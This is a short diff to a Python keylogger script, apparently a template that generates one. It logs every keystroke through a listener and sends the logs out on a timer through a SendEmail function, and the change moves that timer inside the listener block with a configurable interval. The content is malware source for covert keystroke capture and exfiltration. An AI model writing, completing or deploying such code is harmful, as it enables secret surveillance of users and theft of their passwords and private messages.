@@ -89,10 +89,9 @@ def SendEmail():
 def on_press(key):
     logging.info(str(key))
 
-setInterval(SendEmail, {SleepTime})
 
 with Listener(on_press=on_press) as listener:
-    setInterval(SendEmail, 30)
+    setInterval(SendEmail, {SleepTime})
     listener.join()
 
 '''
